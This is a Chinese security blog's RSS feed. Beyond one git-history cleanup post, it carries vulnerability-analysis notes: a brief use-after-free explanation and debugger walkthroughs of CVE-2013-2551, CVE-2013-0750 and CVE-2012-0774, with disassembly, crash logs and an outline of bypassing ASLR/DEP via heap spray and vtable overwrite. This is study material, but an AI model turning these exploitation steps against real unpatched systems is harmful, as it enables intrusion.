<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="https://www.w3.org/2005/Atom">
  <channel>
    <title>quanyechavshuo</title>
    <description>A blog about programming and network security</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Mon, 23 Jan 2017 08:29:31 +0800</pubDate>
    <lastBuildDate>Mon, 23 Jan 2017 08:29:31 +0800</lastBuildDate>
    <generator>Jekyll v3.3.1</generator>
    
      <item>
        <title>删除github项目历史版本中的敏感文件</title>
        <description>&lt;h3 id=&quot;steps&quot;&gt;Steps&lt;/h3&gt;

&lt;p&gt;eg.删除https://www.github.com/3xp10it/MyToolKit项目历史版本中敏感文件&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.cd /tmp &amp;amp;&amp;amp; git clone https://github.com/dxa4481/truffleHog.git &amp;amp;&amp;amp; cd truffleHog
2.pip3 install -r requirements.txt
3.python3 truffleHog.py https://www.github.com/3xp10it/MyToolKit
    or
  python3 truffleHog.py https://github.com/3xp10it/MyToolKit.git
  此时找到了有敏感密码的文件my_bing_domains_v1_alone.py
4.cd /tmp &amp;amp;&amp;amp; git clone https://github.com/3xp10it/MyToolKit.git &amp;amp;&amp;amp; cd MyToolKit
5.cp my_bing_domains_v1_alone.py /tmp/
  这里是为了备份这个有敏感密码的文件
6.git filter-branch --force --index-filter 'git rm --cached --ignore-unmatch my_bing_domains_v1_alone.py' --prune-empty --tag-name-filter cat -- --all
  这里是为了删除所有commit中的my_bing_domains_v1_alone.py文件
7.git push origin --force --all
8.git push origin --force --tags
9.git for-each-ref --format='delete %(refname)' refs/original | git update-ref --stdin
10.git reflog expire --expire=now --all
11.git gc --prune=now
12.python3 /tmp/truffleHog/truffleHog.py https://www.github.com/3xp10it/MyToolKit
  这里是为了验证是否成功清除历史版本中的敏感文件
13.如果有需要,将备份的my_bing_domains_v1_alone.py有关密码的部分代码修改成没有明文密码后上传到github 
    cp /tmp/my_bing_domains_v1_alone.py /tmp/MyToolKit/
    cd /tmp/MyToolKit
    git add .
    git commit -a -m &quot;clean passwords&quot;
    git push -u origin master
    如果没有必要将my_bing_domains_v1_alone.py文件上传则这一步不需要,例如my_bing_domains_v1_alone.py文件是一个纯
    配置文件而没有关键代码的时候,这时直接将所有历史版本中的该文件删除即可
14.done
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;reffer&quot;&gt;Reffer&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://help.github.com/articles/removing-sensitive-data-from-a-repository/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Mon, 16 Jan 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/auxilary/2017/01/16/%E5%88%A0%E9%99%A4github%E9%A1%B9%E7%9B%AE%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC%E4%B8%AD%E7%9A%84%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/</link>
        <guid isPermaLink="true">http://localhost:4000/auxilary/2017/01/16/%E5%88%A0%E9%99%A4github%E9%A1%B9%E7%9B%AE%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC%E4%B8%AD%E7%9A%84%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/</guid>
        
        <category>git</category>
        
        <category>github</category>
        
        <category>truffleHog</category>
        
        
        <category>auxilary</category>
        
      </item>
    
      <item>
        <title>UAF漏洞</title>
        <description>&lt;p&gt;0x00 理解&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;uaf漏洞叫作&quot;释放后重引用&quot;漏洞,触发漏洞在于&quot;重引用&quot;这个动作,而重引用之前要通过&quot;占坑&quot;方式来修改要&quot;重引用&quot;的指针对
应内存中的数据,然后&quot;重引用&quot;到变化了的构造好的数据,导致执行任意代码
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Thu, 12 Jan 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/01/12/UAF%E6%BC%8F%E6%B4%9E/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/01/12/UAF%E6%BC%8F%E6%B4%9E/</guid>
        
        <category>uaf</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>漏洞战争-cve-2013-2551</title>
        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;漏洞源:vgx.dll在处理&amp;lt;v:stroke&amp;gt;标签的dashstyle.array.length属性时,没有对传入的参数进行完备验证而导致整数溢出
调试环境:
    win7
good knowledge:
    http://www.isclab.org.cn/archives/2014/11/2830.html
    http://www.voidcn.com/blog/tony_whu/article/p-4307461.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-分析&quot;&gt;0x01 分析&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;poc中关键处为:
    vml1.dashstyle=&quot;1 2 3 4 ... 44&quot;
    vml1.dashstyle.array.length=0-1
    shape.dashstyle.array.length=0-1
也即在设置dashstyle.array.length时,由原来的44变成了-1,这样导致了整数溢出漏洞,产生了数组越界访问的读写能力,而
COARuntimeStyle对象偏移0x58处为可控字符串指针,可以将可控字符串设置成AAAAAA,书中poc中为:a[i].marginLeft=&quot;a&quot;
这样就可以通过动态调试中找到内存中AAAAAA与模块基址的偏移量,从而由AAAAAA的内存地址减去该偏移量得到aslr下的模块的
基址,由此基址可通过heap spray构造rop gadgets绕过dep+aslr,然后再次利用数组越界访问的读写能力改写对象的虚表指针就
可以控制eip了

通过poc分析这个整数溢出漏洞的溢出细节可这样实现:
1)找到poc中关键的代码:vml1.dashstyle.array.length=0-1
2)通过ida中的&quot;Functions Windows&quot;中按&quot;alt+t&quot;组合键找到1)中对应的dll中的对应类的函数:
    vgx.dll中的COALineDashStyleArray类中的put_length函数
3)windbg中bu vgx!COALineDashStyleArray::put_length
4)单步调试分析汇编指令(细心活):
    分析得到导致整数溢出的关键点在
        mov esi,dword ptr [ebp+0Ch] ss:0023:040fa190=ffffffff  //获取到dashstyle数组长度值0xFFFFFFFF
        cmp eax,esi //与poc中原来设置的dashstyle数组长度0x2C做比较,大于等于则跳转
        jge vgx!COALineDashStyleArray::put_length+0xca处 //口诀:AB无符号,GL有符号,此处为g(有符号比较),导致漏洞
        的产生

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Tue, 27 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/27/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2013-2551/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/27/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2013-2551/</guid>
        
        <category>漏洞分析</category>
        
        <category>整数溢出</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>漏洞战争-cve-2013-0750</title>
        <description>&lt;h3 id=&quot;0x00-prepare&quot;&gt;0x00 Prepare&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.firefox17.0下载链接
ftp://ftp.mozilla.org/pub/mozilla.org/firefox/releases/17.0/win32/zh-CN/Firefox%20Setup%2017.0.exe
2.firefox 17.0源码下载链接
http://releases.mozilla.org/pub/mozilla.org/firefox/releases/17.0/source/firefox-17.0.source.tar.bz2
3.firefox官方符号表服务器地址(在windbg中添加File|Symbol File Path)
SRV*c:\symbollocal\*http://symbols.mozilla.org/firefox
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-分析&quot;&gt;0x01 分析&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;windbg|File|Symbol File Path|在最后添加;SRV*d:\symbollocal\*http://symbols.mozilla.org/firefox
windbg|File|添加资源文件路径C:\Users\klionsec7\Desktop\mozilla-release
打开firefox17.0
f6附加firefox.exe
g
firefox打开poc.html
    (ae4.131c): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=14405418 ebx=002dbbd8 ecx=002e1000 edx=14600000 esi=002dbb80 edi=072b0031
    eip=693c2aa3 esp=002dba68 ebp=002dbaa0 iopl=0         nv up ei ng nz na pe cy
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010287
    *** WARNING: Unable to verify checksum for C:\Program Files (x86)\Mozilla Firefox\mozjs.dll
    *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files (x86)\Mozilla 
    Firefox\mozjs.dll - 
    mozjs!js::NewProxyObject+0x1043:
    693c2aa3 668939          mov     word ptr [ecx],di        ds:002b:002e1000=????     
    这里得到的中断下来的信息与书中不一致,这里得到的符号表对应的结果为mozjs!js::NewProxyObject+0x1043,书中得到的
    结果为mozjs!ReplaceRegExpCallback+0x183,对应的汇编指令都是:mov word ptr [ecx],di
    上面显示没有找到符号文件,查看当前符号路径,使用如下命令

.sympath
    0:000&amp;gt; .sympath
    Symbol search path is: srv*c:symbols*http://msdl.microsoft.com/download/symbols   
    结果中没有开始设置的firefox的符号表服务器地址,不知什么原因,调试器默认采用延迟模式加载符号,重新打开windbg,使
    用如下命令添加firefox的符号表路径

f6附加firefox.exe
.sympath+ SRV*c:\symbollocal\*http://symbols.mozilla.org/firefox
.sympath    
    Symbol search path is: srv*c:symbols*http://msdl.microsoft.com/download/symbols;
    SRV*c:\symbollocal\*http://symbols.mozilla.org/firefox
.reload
    这里如果不.reload依然会找不到符号表,可参考如下链接
    http://www.cnblogs.com/kissdodog/p/3729396.html
g
firefox打开poc.html
    (984.a00): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=0d4040d8 ebx=0045bf18 ecx=00460000 edx=0d600000 esi=0045bec0 edi=02200031
    eip=6d752aa3 esp=0045bda8 ebp=0045bde0 iopl=0         nv up ei ng nz na pe cy
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010287
    *** WARNING: Unable to verify checksum for C:\Program Files (x86)\Mozilla Firefox\mozjs.dll
    mozjs!ReplaceRegExpCallback+0x183:
    6d752aa3 668939          mov     word ptr [ecx],di        ds:002b:00460000=0000
kv
    ChildEBP RetAddr  Args to Child              
    0045bde0 6d799af8 05115710 0804d200 00000000 mozjs!ReplaceRegExpCallback+0x183 (FPO: [Non-Fpo]) 
    [e:\builds\moz2_slave\rel-m-rel-w32-bld\build\js\src\jsstr.cpp @ 2099]
    0045be10 6d79a333 00000001 0845f8e0 6d752920 mozjs!DoMatch+0xc8 (FPO: [Non-Fpo]) 
    [e:\builds\moz2_slave\rel-m-rel-w32-bld\build\js\src\jsstr.cpp @ 1694]
    0045be4c 6d7451e1 0045bec0 05410078 00000002 mozjs!str_replace_regexp+0x83 (FPO: [Non-Fpo]) 
    [e:\builds\moz2_slave\rel-m-rel-w32-bld\build\js\src\jsstr.cpp @ 2278]
    *** WARNING: Unable to verify checksum for C:\Program Files (x86)\Mozilla Firefox\firefox.exe
    0045bf6c 00310031 00310031 00310031 00310031 mozjs!js::str_replace+0x261 (FPO: [Non-Fpo]) 
    [e:\builds\moz2_slave\rel-m-rel-w32-bld\build\js\src\jsstr.cpp @ 2464]
    0045bf7c 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bf80 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bf84 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bf88 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bf8c 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bf90 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bf94 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bf98 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bf9c 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bfa0 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bfa4 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bfa8 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bfac 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bfb0 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bfb4 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bfb8 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    kv命令的结果中可以看到源码文件是jsstr.cpp,这里的kv的结果中的jsstr.cpp的路径并不是实际系统中的路径,可能是
    windbg的bug,在本地磁盘中全局搜索jsstr.cpp文件,找到后用windbg打开[文件|打开源文件|]这时可以看到windbg中新出
    现了一个源代码的面板,如果不手动打开,windbg不能自己找到,源代码面板中定位到如下位置:
        
    static bool
    ReplaceRegExpCallback(JSContext *cx, RegExpStatics *res, size_t count, void *p)
    {
        ReplaceData &amp;amp;rdata = *static_cast&amp;lt;ReplaceData *&amp;gt;(p);

        rdata.calledBack = true;
        size_t leftoff = rdata.leftIndex;
        size_t leftlen = res-&amp;gt;matchStart() - leftoff;
        rdata.leftIndex = res-&amp;gt;matchLimit();

        size_t replen = 0;  /* silence 'unused' warning */
        if (!FindReplaceLength(cx, res, rdata, &amp;amp;replen))
            return false;

        size_t growth = leftlen + replen;
        if (!rdata.sb.reserve(rdata.sb.length() + growth))
            return false;

        JSLinearString &amp;amp;str = rdata.str-&amp;gt;asLinear();  /* flattened for regexp */
        const jschar *left = str.chars() + leftoff;

        rdata.sb.infallibleAppend(left, leftlen); /* skipped-over portion of the search value */
        DoReplace(cx, res, rdata);定位到的位置
        return true;
    }
    windbg的源代码面板定位到上面的DoReplace语句处,但是由于缺乏相应版本的符号表,在源码调试中无法直接定位到异常指
    令对应的是DoReplace的哪一句代码.从windbg上设置的符号表服务器地址上对应的符号表一般都是最新的firefox版本的符
    号表,这里调试的firefox的版本是17.0,并不是当前最新版本,所以找不到DoReplace中具体代码位置,为了解决这个问题需
    要自动编译firefox17.0的源码.
    编译需要用到:http://ftp.mozilla.org/pub/mozilla/libraries/win32/中的mozillabuildsetup1.7,eg.将
    mozillabuildsetup1.7安装到C:\mozilla-build\,然后将firefox源码中的xulrunner\config目录复制到
    c:\mozilla-build下,在c:\mozilla-build\config\mozconfig文件中设置如下:

    ac_add_options --enable-application=browser
    ac_add_options --enable-debug
    ac_add_options --enable-tests
    ac_add_options -trace-malloc
    ac_add_options --disable-webgl
    打开mozzillabuildsetup安装目录下的start-msvc10.bat来启动vs2010后,进入mozilla源码目录,执行make -f client.mk
    build.
    系统需要安装vs2010,这里不再继续,分析至此.


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Mon, 26 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/26/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2013-0750/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/26/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2013-0750/</guid>
        
        <category>漏洞分析</category>
        
        <category>源码调试</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>漏洞战争-cve-2012-0774</title>
        <description>&lt;h3 id=&quot;0x00-prepare&quot;&gt;0x00 Prepare&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.adobe reader 9.4.0
2.immunity debugger
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-分析&quot;&gt;0x01 分析&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;打开adobe reader,od附加
f9
adobe reader中打开poc.pdf
    adobe reader崩溃,但是od无法捕获异常,换成immunity debugger可捕获异常位置

重新打开reader,immunity debugger附加
f9
reader打开poc.pdf,异常捕获,中断如下:
    6DD979C9   8D71 04          LEA ESI,DWORD PTR DS:[ECX+4]
    6DD979CC   8B1E             MOV EBX,DWORD PTR DS:[ESI]
    6DD979CE   8919             MOV DWORD PTR DS:[ECX],EBX
    6DD979D0   8BCE             MOV ECX,ESI
    6DD979D2  ^75 F4            JNZ SHORT CoolType.6DD979C8
    6DD979D4   83E8 04          SUB EAX,4
    中断位置为6dd979ce处的MOV DWORD PTR DS:[ECX],EBX,immunity debugger中下面状态栏中显示:access violation when
    wring to 6dfcf000,也即[ecx]所在内存空间不可写,因此导致崩溃，从当前堆栈窗口中找出最上面的return to的地址,右
    键在反汇编窗口跟随,得到当前的6dd979ce处的指令在如下call 调用的函数帧空间中:

    6DD96956   50               PUSH EAX
    6DD96957   FF148D D0BEFA6D  CALL DWORD PTR DS:[ECX*4+6DFABED0]       ; vulfunc
    6DD9695E   59               POP ECX
    将6dd96957处的调用标记为vulfunc,现在要在6dd96957处下断点并查看这个调用过程,但是有aslr机制,重新下断时这里不
    再会是6dd96957,需算出6dd96957与当前dll的偏移再根据偏移在重新运行reader后下断点,alt+e:
    
    Executable modules, item 22
    Base=6DD90000
    Size=0025F000 (2486272.)
    Entry=6DDD866B CoolType.&amp;lt;ModuleEntryPoint&amp;gt;
    Name=CoolType
    File version=5.05.73.1
    Path=C:\Program Files (x86)\Adobe\Reader 9.0\Reader\CoolType.dll
    在alt+e窗口中得到vulfunc在CoolType.dll中,且vulfunc在CoolType.dll中的内存偏移为:6dd96957-6dd90000=6957

重新打开reader并用immu附加,f9,alt+e,发现cooltype.dll的基址不变,仍然是6dd90000,那么前面一步的计算偏移就是多余的
了,看来泉哥在这里的想法不完全正确,这里不用算偏移,应该是操作系统没有为cooltype.dll开aslr.可直接在6dd96957处下断.
后来发现是自己错了,重新运行reader并用immu附加后cooltype.dll的地址会是6dd90000或是69360000,eg.第一次运行reader并
用immu附加后cooltype.dll的基址为6dd90000,关闭reader和immu后,第二次运行reader并用immu附加后cooltype.dll的基址为
69360000,第三次又变回6dd90000,第四次则为69360000,...以此交替.说明cooltype.dll还是开了aslr的.继续用偏移的方法下
断点,重新打开reader,immu附加,第一次cooltype.dll的基址为6dd90000,第二次为69360000,此时在69360000+6957=69366957处
下断

ctrl+g:69366957
f2
    69366955   51               PUSH ECX
    69366956   50               PUSH EAX
    69366957   FF148D D0BE5769  CALL DWORD PTR DS:[ECX*4+6957BED0]
    6936695E   59               POP ECX
    6936695F   59               POP ECX

在69366957处shift+f4下条件记录断点,记录ecx(ecx是虚拟指令索引号),设置为不中断,explanation设成:&quot;index ecx&quot;,
expression设成:&quot;ecx&quot;

f9
reader打开poc.pdf
    再次崩溃,由immu捕获崩溃,与上次崩溃信息相同,得到log面板中日志如下:

    ...
    ...
    ...
    ...
    69366957   COND: index ecx = 00000041
    69366957   COND: index ecx = 00000063
    69366957   COND: index ecx = 00000060
    69366957   COND: index ecx = 00000041
    69366957   COND: index ecx = 00000043
    69366957   COND: index ecx = 000000B0
    69366957   COND: index ecx = 00000061
    69366957   COND: index ecx = 00000042
    69366957   COND: index ecx = 00000043
    69366957   COND: index ecx = 00000078
    69366957   COND: index ecx = 00000041
    69366957   COND: index ecx = 00000063
    69366957   COND: index ecx = 00000060
    69366957   COND: index ecx = 00000041
    69366957   COND: index ecx = 00000043
    69366957   COND: index ecx = 000000B0
    69366957   COND: index ecx = 00000061
    69366957   COND: index ecx = 00000042
    69366957   COND: index ecx = 00000043
    69366957   COND: index ecx = 00000078
    69366957   COND: index ecx = 00000041
    69366957   COND: index ecx = 00000060
    69366957   COND: index ecx = 00000060
    69366957   COND: index ecx = 00000026
    693679CE   [18:15:48] Access violation when writing to [6959F000]
    说明是索引号为26的call调用造成了access violation,设置条件断点:当ecx为26时中断

重新打开reader并用immu附加,这次cooltype.dll基址为6dd90000,6dd90000+6957=6dd96957,ctrl+g:6dd96957
    6DD96955   51               PUSH ECX
    6DD96956   50               PUSH EAX
    6DD96957   FF148D D0BEFA6D  CALL DWORD PTR DS:[ECX*4+6DFABED0]       ; vulfunc
    6DD9695E   59               POP ECX
    6DD9695F   59               POP ECX
    6DD96960   3BC6             CMP EAX,ESI

在6dd96957上设置条件断点,shift+f2,设置断点条件为ecx==26
f9
reader打开poc.pdf
    成功中断到6dd96957处,且ecx=26,f7跟进call,汇编指令如下:

    6DD9798B   A1 E023FC6D      MOV EAX,DWORD PTR DS:[6DFC23E0]
    6DD97990   8B0D EC23FC6D    MOV ECX,DWORD PTR DS:[6DFC23EC]
    6DD97996   53               PUSH EBX
    6DD97997   56               PUSH ESI
    6DD97998   8B31             MOV ESI,DWORD PTR DS:[ECX]
    6DD9799A   8D50 FC          LEA EDX,DWORD PTR DS:[EAX-4]
    6DD9799D   3BD6             CMP EDX,ESI
    6DD9799F   57               PUSH EDI
    6DD979A0   72 45            JB SHORT CoolType.6DD979E7
    6DD979A2   8BB9 54010000    MOV EDI,DWORD PTR DS:[ECX+154]
    6DD979A8   3BD7             CMP EDX,EDI
    6DD979AA   73 3B            JNB SHORT CoolType.6DD979E7
    6DD979AC   83C0 FC          ADD EAX,-4
    6DD979AF   8B10             MOV EDX,DWORD PTR DS:[EAX]
    6DD979B1   8BDA             MOV EBX,EDX
    6DD979B3   C1E3 02          SHL EBX,2
    6DD979B6   8BC8             MOV ECX,EAX
    6DD979B8   2BCB             SUB ECX,EBX
    6DD979BA   3BCE             CMP ECX,ESI
    6DD979BC   72 29            JB SHORT CoolType.6DD979E7
    6DD979BE   3BCF             CMP ECX,EDI
    6DD979C0   73 25            JNB SHORT CoolType.6DD979E7
    6DD979C2   85D2             TEST EDX,EDX
    6DD979C4   8B39             MOV EDI,DWORD PTR DS:[ECX]
    6DD979C6   7E 0F            JLE SHORT CoolType.6DD979D7
    6DD979C8   4A               DEC EDX
    6DD979C9   8D71 04          LEA ESI,DWORD PTR DS:[ECX+4]
    6DD979CC   8B1E             MOV EBX,DWORD PTR DS:[ESI]
    6DD979CE   8919             MOV DWORD PTR DS:[ECX],EBX
    6DD979D0   8BCE             MOV ECX,ESI
    6DD979D2  ^75 F4            JNZ SHORT CoolType.6DD979C8
    6DD979D4   83E8 04          SUB EAX,4
    6DD979D7   8938             MOV DWORD PTR DS:[EAX],EDI
    6DD979D9   83C0 04          ADD EAX,4
    6DD979DC   A3 E023FC6D      MOV DWORD PTR DS:[6DFC23E0],EAX
    6DD979E1   8B4424 10        MOV EAX,DWORD PTR SS:[ESP+10]
    6DD979E5   EB 0F            JMP SHORT CoolType.6DD979F6
    6DD979E7   A1 3824FC6D      MOV EAX,DWORD PTR DS:[6DFC2438]
    6DD979EC   C705 3424FC6D 10&amp;gt;MOV DWORD PTR DS:[6DFC2434],1110
    6DD979F6   5F               POP EDI
    6DD979F7   5E               POP ESI
    6DD979F8   5B               POP EBX
    6DD979F9   C3               RETN
    此时eip=6dd9768b,单步跟踪

f8
f8
...
eip=6dd979b3
    此时汇编指令为shl ebx,2,寄存器值如下:

    EAX 6DFC622C CoolType.6DFC622C
    ECX 0577E4E4
    EDX 40000001
    EBX 40000001
    ESP 0014CA20
    EBP 0014CAB4
    ESI 6DFC6220 ASCII &quot;AA&quot;
    EDI 6DFC6344 ASCII &quot;tnfs&quot;
    EIP 6DD979B3 CoolType.6DD979B3
    这里的ebx为0x40000001,shl ebx,2之后得到ebx=0x40000001*4=0x100000004=0x00000004,导致整数溢出,再继续单步跟踪
    到6DD979CE处的MOV DWORD PTR DS:[ECX],EBX应该会出现前面一样的access violation,reader崩溃.

f8
...
eip=6dd979ce
    此时并没有崩溃,因为在6dd979c8到6dd979d2为一个循环,会在这个循环中的某一次中出现access violation使得reader崩
    溃,0x40000001是溢出的关键,它完全是由虚拟指令操作实现的.为了看清0x40000001是怎么出现的,需要知道每个虚拟指令
    索引号对应的call中的汇编指令效果,于是对溢出前的每个虚拟指令索引号对应的CALL DWORD PTR DS:[ECX*4+6DFABED0]
    设置条件记录断点,记录call前与call后虚拟栈顶vm_esp的值及虚拟指令.这里的虚拟栈顶vm_esp并不是指esp中的数据,这
    里的虚拟指令类似于java的虚拟机指令,是&quot;虚拟的&quot;,并不是真实栈中的数据,而是对虚拟指令而言的&quot;虚拟栈&quot;,如B0 01虚拟
    指令对应将1压栈的动作,这里的压栈是对虚拟指令而言的栈,并不是真实的esp中的栈,要想得到&quot;虚拟栈&quot;中的数据,需要得到
    &quot;虚拟栈&quot;对应的真实内存地址,跟踪B0 01虚拟指令的CALL DWORD PTR DS:[ECX*4+6DFABED0]的处理情况,进行如下操作

重新打开read并用immu附加,这次cooltype.dll的基址为69360000,ctrl+g:69366957,在69366957处下条件断点,设置条件为
ecx=0xB0

f9
reader打开poc.pdf
    成功中断在ecx=b0情况下,对应call的函数帧中指令如下:
            
    69368B05   A1 E0235969      MOV EAX,DWORD PTR DS:[695923E0]
    69368B0A   8B15 EC235969    MOV EDX,DWORD PTR DS:[695923EC]
    69368B10   8D48 04          LEA ECX,DWORD PTR DS:[EAX+4]
    69368B13   3B8A 54010000    CMP ECX,DWORD PTR DS:[EDX+154]
    69368B19   77 18            JA SHORT CoolType.69368B33
    69368B1B   3B0A             CMP ECX,DWORD PTR DS:[EDX]
    69368B1D   76 14            JBE SHORT CoolType.69368B33
    69368B1F   8B4C24 04        MOV ECX,DWORD PTR SS:[ESP+4]
    69368B23   0FB611           MOVZX EDX,BYTE PTR DS:[ECX]
    69368B26   8910             MOV DWORD PTR DS:[EAX],EDX
    69368B28   8305 E0235969 04 ADD DWORD PTR DS:[695923E0],4
    69368B2F   8D41 01          LEA EAX,DWORD PTR DS:[ECX+1]
    69368B32   C3               RETN
    由于B0 01虚拟指令对应的虚拟动作是将1压栈,现在要找到1所在的真实内存位置,f8单步

f8
...
...
f8
eip=69368b26时,edx=1,[eax]=1,对应&quot;虚拟栈顶&quot;vm_esp中的数据
f8
eip=69368b28时,此时已经将1赋值给[eax],此时可以看到[695923e0]=69596240=eax
f8
    eip=69368b2f,此时已经执行完ADD DWORD PTR DS:[695923E0],4,后面再f8再次就执行完call了,执行完call之后要想得到
    &quot;虚拟栈顶&quot;vm_esp中的数据的方法为:查看真实内存中的值[[695923e0]-4],所以要想得到溢出前每个索引对应的call在
    call执行前与call执行后虚拟栈顶的值及虚拟指令,则需要设置条件记录断点,并设置expression为:&quot;[[695923e0]-4]&quot;,为
    了观察更多,也记录vm_esp-4中的数据,并在call调用前和调用后分别记录,也即最后这样设置:
    在call的上一句指令处设置条件记录断点,并设置explanation为:&quot;执行前[vm_esp]&quot;,设置expression为:&quot;[[695923e0]-4]&quot;
    在call的上一句指令处设置条件记录断点,并设置explanation为:&quot;执行前[vm_esp-4],设置expression为&quot;[[695923e0]-8]&quot;
    在call指令处设置条件记录断点,并设置explanation为:&quot;虚拟指令索引号&quot;,设置expression为&quot;ecx&quot;
    在call的下一句指令处设置条件记录断点,并设置explanation为:&quot;执行后[vm_esp]&quot;,设置expression为:&quot;[[695923e0]-4]&quot;
    在call的下一句指令处设置条件记录断点,并设置explanation为:&quot;执行后[vm_esp-4],设置expression为&quot;[[695923e0]-8]&quot;
    上面5个设置中都设置不中断且记录expression的值

重新打开read并用immu附加,此时cooltype.dll基址为6dd90000,关键call调用的地址为6dd96957   
ctrl+g:6dd96957,按照上面的5个设置条件记录断点之后便可得到书中对应log记录,再通过分析log得到0x40000001的来源过程.
需注意要在32位系统上调试,如果在64位系统上调试应该设置explanation为vm_esp和vm_esp-8,expression对应为
[[695923e0]-4]和[[695923e0]-0xc].

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Sun, 25 Dec 2016 00:00:00 +0800</pubDate>
